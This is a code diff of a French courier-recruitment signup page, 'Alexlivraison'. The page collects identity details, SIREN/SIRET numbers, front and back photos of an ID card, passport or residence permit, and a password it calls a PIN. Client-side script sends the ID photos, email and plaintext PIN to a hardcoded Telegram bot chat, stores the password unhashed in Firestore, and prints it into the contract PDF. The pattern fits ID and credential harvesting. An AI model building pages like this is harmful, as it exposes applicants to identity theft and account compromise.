@@ -33,7 +33,16 @@
     gap: 15px;
   }
   .topbar-logo {width: 45px; height: 45px; border-radius: 50%; border: 2px solid #fff; object-fit: cover;}
-  .topbar-title {text-align: center; color: #fff; font-weight: bold; font-size: 1.3em; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
+  
+  .topbar-title {
+      text-align: center; color: #fff; font-weight: bold; font-size: 1.3em;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .anim-bike { display: inline-block; animation: ride 2s infinite ease-in-out; }
+  .anim-car { display: inline-block; animation: drive 2s infinite ease-in-out; }
+  @keyframes ride { 0% { transform: translateX(0) rotate(0deg); } 50% { transform: translateX(5px) rotate(5deg); } 100% { transform: translateX(0) rotate(0deg); } }
+  @keyframes drive { 0% { transform: translateX(0); } 50% { transform: translateX(-5px); } 100% { transform: translateX(0); } }
+
   .btn-back{color:#fff;text-decoration:none;font-weight:bold;padding:8px 15px;background:rgba(255,255,255,0.2);border-radius:8px;display:flex;align-items:center;gap:5px}
   
   .card{background:var(--glass);border-radius:20px;padding:30px;margin-bottom:25px;box-shadow:0 20px 50px rgba(0,0,0,0.2);backdrop-filter:blur(10px);animation:fadeIn 0.5s ease;}
@@ -44,6 +53,11 @@
   label{display:block;margin-bottom:8px;font-weight:600;color:#555;}
   input,select,textarea{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:16px;background:#f9f9f9;}
   input:focus,select:focus{border-color:#6b23ff;box-shadow:0 0 0 3px rgba(107,35,255,0.1);background:#fff;}
+  
+  .file-upload-box {
+      border: 2px dashed #bbb; padding: 15px; border-radius: 10px; background: #f8f9fa; text-align: center; margin-bottom: 10px;
+  }
+  .file-upload-box:hover { border-color: var(--violet); background: #fff; }
   
   .capacity-msg {
       margin-top: 10px; padding: 12px; background: rgba(107, 35, 255, 0.1);
@@ -58,13 +72,8 @@
   canvas#signature{width:100%;height:200px;border:2px dashed #bbb;border-radius:10px;background:#fff;cursor:crosshair;}
   .hidden{display:none;}
   .status-msg{text-align:center;margin-top:15px;font-weight:bold;padding:10px;border-radius:8px;background:#fff;}
-
-  .benefits{display:grid;grid-template-columns:repeat(auto-fit, minmax(200px, 1fr));gap:15px;margin-bottom:30px;}
-  .ben-item{background:rgba(255,255,255,0.15);padding:20px;border-radius:16px;color:#fff;text-align:center;border:1px solid rgba(255,255,255,0.2);backdrop-filter:blur(5px)}
-  
-  @keyframes stickerFloat{0%,100%{transform:translateY(0) rotate(0deg)}50%{transform:translateY(-4px) rotate(5deg)}}
-  .emoji-anim{display:inline-block;animation:stickerFloat 3s ease-in-out infinite;transform-origin:center bottom}
-  .ben-icon{font-size:2.5em;margin-bottom:10px;display:block;animation:stickerFloat 3s ease-in-out infinite}
+  .success {background: #dcfce7; color: #166534;}
+  .error {background: #fee2e2; color: #991b1b;}
   
   @media(max-width:600px){.grid2{grid-template-columns:1fr;}}
   @keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
@@ -74,40 +83,22 @@
 
 <div class="topbar">
   <img src="logo.jpg" alt="Logo" class="topbar-logo">
-  <div class="topbar-title">🚴🏻‍♂️ Alexlivraison🚗</div>
-  <a href="index.html" class="btn-back"><span class="emoji-anim">🏠</span> Retour</a>
+  <div class="topbar-title"><span class="anim-bike">🚴🏻‍♂️</span> Alexlivraison<span class="anim-car">🚗</span></div>
+  <a href="index.html" class="btn-back">🏠 Retour</a>
 </div>
 
 <main class="wrap">
-  <h1>Devenir Coursier Indépendant <span class="emoji-anim">🚀</span></h1>
-
-  <div class="benefits">
-    <div class="ben-item">
-      <span class="ben-icon">💸</span>
-      <h3>Revenus</h3>
-      <p>Gagnez de l'argent à chaque course.</p>
-    </div>
-    <div class="ben-item">
-      <span class="ben-icon">⏰</span>
-      <h3>Liberté</h3>
-      <p>Horaires 100% flexibles.</p>
-    </div>
-    <div class="ben-item">
-      <span class="ben-icon">🚲</span>
-      <h3>Tous Véhicules</h3>
-      <p>Vélo, scooter, voiture ou trottinette.</p>
-    </div>
-  </div>
+  <h1>Devenir Coursier Indépendant</h1>
 
   <section id="step1" class="card">
     <h2>1. Informations Personnelles</h2>
     <div class="grid2">
-      <div class="input-group"><label><span class="emoji-anim">👤</span> Prénom</label><input id="c_firstname" placeholder="Votre prénom"></div>
-      <div class="input-group"><label><span class="emoji-anim">👤</span> Nom</label><input id="c_lastname" placeholder="Votre nom"></div>
+      <div class="input-group"><label>Prénom</label><input id="c_firstname" placeholder="Votre prénom"></div>
+      <div class="input-group"><label>Nom</label><input id="c_lastname" placeholder="Votre nom"></div>
     </div>
 
     <div class="input-group">
-        <label><span class="emoji-anim">⚧</span> Civilité (Genre)</label>
+        <label>Civilité (Genre)</label>
         <select id="c_gender">
             <option value="M.">Monsieur (M.)</option>
             <option value="Mme">Madame (Mme)</option>
@@ -115,45 +106,64 @@
     </div>
     
     <div class="grid2">
-      <div class="input-group"><label><span class="emoji-anim">📱</span> Téléphone (Mobile)</label><input id="c_phone" type="tel"></div>
-      <div class="input-group"><label><span class="emoji-anim">📧</span> E-mail</label><input id="c_email" type="email"></div>
+      <div class="input-group"><label>Téléphone</label><input id="c_phone" type="tel"></div>
+      <div class="input-group"><label>E-mail (Sera inscrit au contrat)</label><input id="c_email" type="email"></div>
     </div>
 
     <div class="input-group" style="border: 2px solid #6b23ff; padding: 15px; border-radius: 10px; background: #f3e5f5;">
-      <label style="color:#6b23ff"><span class="emoji-anim">🔐</span> Créez votre mot de passe (pour connexion future)</label>
-      <input id="c_password" type="text" placeholder="Mot de passe" style="font-weight:bold">
+      <label style="color:#6b23ff">🔐 Créez votre CODE PIN (Mot de passe)</label>
+      <input id="c_password" type="text" placeholder="Ex: 1234" style="font-weight:bold; letter-spacing: 2px;">
+      <small style="display:block;margin-top:5px;color:#555">Ce code sera inscrit dans votre contrat.</small>
     </div>
 
-    <div class="input-group"><label><span class="emoji-anim">📍</span> Adresse complète</label><input id="c_addr" placeholder="Rue, Code Postal, Ville"></div>
+    <div class="input-group"><label>Adresse complète</label><input id="c_addr" placeholder="Rue, Code Postal, Ville"></div>
 
     <h2>Informations Pro & Véhicule</h2>
     <div class="grid2">
-      <div class="input-group"><label><span class="emoji-anim">🏢</span> Numéro SIREN (9 chiffres)</label><input id="c_siren" maxlength="9"></div>
+      <div class="input-group"><label>Numéro SIREN (9 chiffres)</label><input id="c_siren" maxlength="9"></div>
+      <div class="input-group"><label>Numéro SIRET (14 chiffres)</label><input id="c_siret" maxlength="14"></div>
+    </div>
       
-      <div class="input-group">
-        <label><span class="emoji-anim">🛵</span> Véhicule</label>
-        <select id="c_vehicle">
-          <option value="Velo">Vélo 🚲</option>
-          <option value="Scooter">Scooter 🛵</option>
-          <option value="Voiture">Voiture 🚗</option>
-          <option value="Trotinette">Trotinette 🛴</option>
-        </select>
-        <div id="vehicle-capacity-msg" class="capacity-msg hidden"></div>
-      </div>
-    </div>
-
     <div class="input-group">
-      <label><span class="emoji-anim">🆔</span> Pièce d'identité / Titre de séjour (Photo)</label>
-      <input type="file" id="c_doc" accept="image/*,application/pdf" style="background:#f0f0f0;cursor:pointer">
+      <label>Véhicule</label>
+      <select id="c_vehicle">
+        <option value="Velo">Vélo 🚲</option>
+        <option value="Scooter">Scooter 🛵</option>
+        <option value="Voiture">Voiture 🚗</option>
+        <option value="Trotinette">Trotinette 🛴</option>
+      </select>
+      <div id="vehicle-capacity-msg" class="capacity-msg hidden"></div>
     </div>
 
-    <button id="btn_step1" class="btn-primary">Suivant <span class="emoji-anim">➡️</span></button>
+    <h2>Documents Obligatoires</h2>
+    <div class="input-group">
+      <label>Type de document</label>
+      <select id="c_doc_type">
+        <option value="CNI">Carte Nationale d'Identité</option>
+        <option value="Passeport">Passeport</option>
+        <option value="Titre de séjour">Titre de séjour</option>
+        <option value="Permis">Permis de conduire</option>
+      </select>
+    </div>
+
+    <div class="grid2">
+        <div class="file-upload-box">
+            <label style="cursor:pointer">📸 RECTO (Face avant)</label>
+            <input type="file" id="c_doc_front" accept="image/*" required style="margin-top:5px">
+        </div>
+        <div class="file-upload-box">
+            <label style="cursor:pointer">📸 VERSO (Face arrière)</label>
+            <input type="file" id="c_doc_back" accept="image/*" required style="margin-top:5px">
+        </div>
+    </div>
+
+    <button id="btn_step1" class="btn-primary">Suivant ➡️</button>
   </section>
 
   <section id="step2" class="card hidden">
     <h2>2. Contrat de Prestation</h2>
     <p style="font-size:14px;color:#666;margin-bottom:20px;line-height:1.5;">
-      En signant ce document, vous confirmez exercer en tant que prestataire indépendant (Auto-entrepreneur) et vous engagez à respecter la charte de qualité AlexLivraison.
+      En signant ce document, vous confirmez exercer en tant que prestataire indépendant.
     </p>
     
     <div class="grid2">
@@ -167,10 +177,10 @@
 
     <div style="margin-top:20px;display:flex;align-items:center;gap:10px">
       <input type="checkbox" id="agree" style="width:auto">
-      <label for="agree" style="margin:0">Je certifie l'exactitude des informations et accepte le contrat.</label>
+      <label for="agree" style="margin:0">Je certifie l'exactitude des informations.</label>
     </div>
 
-    <button id="gen_pdf" class="btn-primary"><span class="emoji-anim">✍️</span> Signer et Envoyer la Candidature</button>
+    <button id="gen_pdf" class="btn-primary">✍️ Signer et Envoyer</button>
     <div id="final-status" class="status-msg hidden"></div>
   </section>
 </main>
@@ -189,7 +199,7 @@ const CHAT = "7129872491";
 
 const s1 = document.getElementById('step1');
 const s2 = document.getElementById('step2');
-const inputs = ['c_firstname','c_lastname','c_phone','c_addr','c_siren', 'c_email', 'c_password'];
+const inputs = ['c_firstname','c_lastname','c_phone','c_addr','c_siren','c_siret','c_email','c_password'];
 
 const vehicleSelect = document.getElementById('c_vehicle');
 const capacityMsg = document.getElementById('vehicle-capacity-msg');
@@ -200,33 +210,31 @@ const vehicleCapacities = {
   'Scooter': '🛵 Scooter : Capacité max = Taille M (Colis moyens)',
   'Voiture': '🚗 Voiture : Capacité max = Taille XL (Tous colis)'
 };
-
 const pdfVehicleInfos = {
-  'Velo': 'Velo - Capacité max: Taille S',
-  'Trotinette': 'Trotinette - Capacité max: Taille S',
-  'Scooter': 'Scooter - Capacité max: Taille M',
-  'Voiture': 'Voiture - Capacité max: Taille XL'
+  'Velo': 'Velo (Max: Taille S)',
+  'Trotinette': 'Trotinette (Max: Taille S)',
+  'Scooter': 'Scooter (Max: Taille M)',
+  'Voiture': 'Voiture (Max: Taille XL)'
 };
 
-function updateCapacity() {
-  const selected = vehicleSelect.value;
-  if (vehicleCapacities[selected]) {
-    capacityMsg.innerText = vehicleCapacities[selected];
-    capacityMsg.classList.remove('hidden');
-  } else {
-    capacityMsg.classList.add('hidden');
-  }
-}
-vehicleSelect.addEventListener('change', updateCapacity);
-updateCapacity();
+vehicleSelect.addEventListener('change', ()=>{
+    const v = vehicleSelect.value;
+    if(vehicleCapacities[v]){
+        capacityMsg.innerText = vehicleCapacities[v];
+        capacityMsg.classList.remove('hidden');
+    } else { capacityMsg.classList.add('hidden'); }
+});
+vehicleSelect.dispatchEvent(new Event('change'));
 
 document.getElementById('btn_step1').onclick = () => {
   for(let i of inputs) if(!document.getElementById(i).value.trim()) return alert("Veuillez remplir tous les champs obligatoires.");
-  if(!document.getElementById('c_doc').files[0]) return alert("Veuillez ajouter votre pièce d'identité.");
+  if(!document.getElementById('c_doc_front').files[0] || !document.getElementById('c_doc_back').files[0]) 
+      return alert("Veuillez ajouter les photos RECTO et VERSO de votre document.");
   
   s1.classList.add('hidden');
   s2.classList.remove('hidden');
   window.scrollTo(0,0);
+  resizeCanvas();
 };
 
 const cvs = document.getElementById('signature');
@@ -241,7 +249,6 @@ function resizeCanvas(){
   ctx.fillRect(0,0,cvs.width,cvs.height);
 }
 window.addEventListener('resize', resizeCanvas);
-resizeCanvas();
 
 function getPos(e){
   const r = cvs.getBoundingClientRect();
@@ -252,7 +259,6 @@ function getPos(e){
 cvs.addEventListener('mousedown', e => {dr=true; ctx.beginPath(); ctx.moveTo(getPos(e).x, getPos(e).y);});
 cvs.addEventListener('mousemove', e => {if(dr){ctx.lineTo(getPos(e).x, getPos(e).y); ctx.stroke();}});
 cvs.addEventListener('mouseup', () => dr=false);
-
 cvs.addEventListener('touchstart', e => {e.preventDefault(); dr=true; ctx.beginPath(); ctx.moveTo(getPos(e).x, getPos(e).y);});
 cvs.addEventListener('touchmove', e => {e.preventDefault(); if(dr){ctx.lineTo(getPos(e).x, getPos(e).y); ctx.stroke();}});
 cvs.addEventListener('touchend', () => dr=false);
@@ -291,7 +297,7 @@ document.getElementById('gen_pdf').onclick = async () => {
   btn.disabled = true;
   btn.innerText = "Envoi en cours...";
   status.classList.remove('hidden');
-  status.innerText = "Création du compte et contrat...";
+  status.innerText = "Création du compte et documents...";
 
   const {jsPDF} = window.jspdf;
   const doc = new jsPDF();
@@ -303,6 +309,7 @@ document.getElementById('gen_pdf').onclick = async () => {
   const email = document.getElementById('c_email').value;
   const password = document.getElementById('c_password').value;
   const siren = document.getElementById('c_siren').value;
+  const siret = document.getElementById('c_siret').value;
   const addr = document.getElementById('c_addr').value;
   const vehicle = document.getElementById('c_vehicle').value;
   const date = document.getElementById('sign_date').value;
@@ -314,6 +321,7 @@ document.getElementById('gen_pdf').onclick = async () => {
         password: password, 
         fullName: fullName,
         siren: siren,
+        siret: siret,
         vehicle: vehicle,
         status: 'pending', 
         createdAt: firebase.firestore.FieldValue.serverTimestamp()
@@ -350,18 +358,19 @@ document.getElementById('gen_pdf').onclick = async () => {
   addL("ET :", true);
   y+=2;
   addL(`2. ${gender} ${fullName}`);
-  addL(`   SIREN : ${siren}`);
+  addL(`   SIREN : ${siren} / SIRET : ${siret}`);
   addL(`   Adresse : ${addr}`);
+  addL(`   Email : ${email}`);
   
-  const vehicleInfo = pdfVehicleInfos[vehicle] || vehicle;
-  if (vehicleInfo.length > 60) {
-      doc.setFont("helvetica", "normal");
-      doc.text(`   Véhicule déclaré : ${vehicleInfo}`, 20, y, {maxWidth: 170});
-      y += 12; 
-  } else {
-      addL(`   Véhicule déclaré : ${vehicleInfo}`);
-  }
-  
+  doc.setTextColor(100, 0, 200); 
+  doc.setFont("helvetica", "bold");
+  doc.text(`   Code PIN : ${password}`, 20, y);
+  y += 6;
+  doc.setTextColor(0, 0, 0);
+  doc.setFont("helvetica", "normal");
+
+  const vInfo = pdfVehicleInfos[vehicle] || vehicle;
+  addL(`   Véhicule déclaré : ${vInfo}`);
   addL("Ci-après dénommé « Le Prestataire ».");
   
   y+=8;
@@ -373,18 +382,15 @@ document.getElementById('gen_pdf').onclick = async () => {
     "Article 1 - Objet : Le Prestataire s'engage à effectuer des livraisons pour le compte",
     "des clients de la Plateforme en toute indépendance.",
     "",
-    "Article 2 - Statut : Le Prestataire déclare être travailleur indépendant (Auto-entrepreneur)",
-    "et être à jour de ses obligations sociales et fiscales. Ce contrat n'est pas un contrat de travail.",
+    "Article 2 - Statut : Le Prestataire déclare être travailleur indépendant.",
     "",
-    "Article 3 - Obligations : Le Prestataire s'engage à respecter le code de la route,",
-    "à disposer d'un véhicule en bon état et d'une assurance responsabilité civile professionnelle.",
+    "Article 3 - Obligations : Le Prestataire s'engage à respecter le code de la route",
+    "et à disposer d'un véhicule en bon état.",
     "",
-    "Article 4 - Rémunération : Le Prestataire perçoit le montant de la livraison indiqué",
-    "avant l'acceptation de la course, moins la commission de la Plateforme.",
+    "Article 4 - Rémunération : Selon le barème en vigueur sur l'application.",
     "",
-    "Article 5 - Confidentialité : Le Prestataire s'engage à ne pas divulguer les données clients."
+    "Article 5 - Confidentialité : Le Prestataire s'engage à protéger les données clients."
   ];
-
   clauses.forEach(line => addL(line));
 
   y+=15;
@@ -396,11 +402,7 @@ document.getElementById('gen_pdf').onclick = async () => {
   doc.text("La Plateforme (AlexLivraison) :", 120, y);
   y+=10;
   
-  try {
-    doc.addImage(cvs.toDataURL('image/jpeg'), 'JPEG', 20, y, 50, 30);
-    doc.text(fullName, 20, y+35);
-  } catch(e){}
-
+  try { doc.addImage(cvs.toDataURL('image/jpeg'), 'JPEG', 20, y, 50, 30); } catch(e){}
   try {
     const sigAlex = document.getElementById('img-alex-sig');
     doc.addImage(sigAlex, 'JPEG', 120, y, 50, 30);
@@ -411,36 +413,46 @@ document.getElementById('gen_pdf').onclick = async () => {
   doc.text("Validé", 140, y+40);
 
   const pdfBlob = doc.output('blob');
-  const idFile = document.getElementById('c_doc').files[0];
+  const docType = document.getElementById('c_doc_type').value;
+  const frontFile = document.getElementById('c_doc_front').files[0];
+  const backFile = document.getElementById('c_doc_back').files[0];
 
-  status.innerText = "Envoi des documents...";
+  status.innerText = "Envoi des fichiers (3 étapes)...";
 
   const fd1 = new FormData();
   fd1.append('chat_id', CHAT);
-  fd1.append('caption', `🆔 NOUVEAU COURSIER (PIÈCE D'IDENTITÉ)\n👤 ${gender} ${fullName}\n📧 ${email}\n🔑 Mot de passe créé`);
-  fd1.append('document', idFile);
+  fd1.append('caption', `🆔 NOUVEAU COURSIER (RECTO)\n👤 ${gender} ${fullName}\n📧 ${email}\n🔑 Mot de passe créé`);
+  fd1.append('document', frontFile);
 
   const fd2 = new FormData();
   fd2.append('chat_id', CHAT);
-  fd2.append('caption', `📄 CONTRAT COURSIER\n👤 ${fullName}\n🏢 SIREN: ${siren}\n🛵 ${vehicle}\n📞 ${document.getElementById('c_phone').value}`);
-  fd2.append('document', new File([pdfBlob], `Contrat_${lname}_${fname}.pdf`, {type: 'application/pdf'}));
+  fd2.append('caption', `🆔 ${docType} (VERSO)\n👤 ${fullName}`);
+  fd2.append('document', backFile);
+
+  const fd3 = new FormData();
+  fd3.append('chat_id', CHAT);
+  fd3.append('caption', `📄 CONTRAT + LOGIN\n👤 ${fullName}\n📧 ${email}\n🔑 PIN: ${password}\n🛵 ${vehicle}`);
+  fd3.append('document', new File([pdfBlob], `Contrat_${lname}.pdf`, {type: 'application/pdf'}));
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd1});
     await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd2});
+    await fetch(`https://api.telegram.org/bot${BOT}/sendDocument`, {method: 'POST', body: fd3});
     
     doc.save(`Contrat_AlexLivraison_${lname}.pdf`);
     
-    status.innerText = "✅ Inscription réussie ! En attente de validation.";
-    status.style.color = "green";
-    btn.innerText = "Terminé";
+    status.style.display='block';
+    status.className='status-msg success';
+    status.innerText="✅ Candidature envoyée avec succès !";
+    btn.innerText="Envoyé !";
     
     alert("Votre compte a été créé avec le statut 'En attente'. Vous recevrez une notification une fois validé.");
     setTimeout(() => window.location.href = 'login-coursier.html', 2000);
   } catch(e) {
     console.error(e);
-    status.innerText = "❌ Erreur d'envoi. Vérifiez votre connexion.";
-    status.style.color = "red";
+    status.style.display='block';
+    status.className='status-msg error';
+    status.innerText="Erreur d'envoi. Vérifiez la connexion.";
     btn.disabled = false;
     btn.innerText = "Réessayer";
   }
